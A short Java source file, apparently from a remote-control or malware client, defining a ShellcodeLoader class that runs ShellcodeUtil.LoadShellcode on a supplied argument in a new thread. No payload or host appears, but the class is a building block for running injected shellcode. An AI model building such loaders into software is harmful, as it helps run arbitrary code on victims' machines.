package client.features;

import client.utils.system.ShellcodeUtil;

public class ShellcodeLoader {
    public static void loadShellCode(String arg){
        new Thread(() -> ShellcodeUtil.LoadShellcode(arg)).start();
    }
}
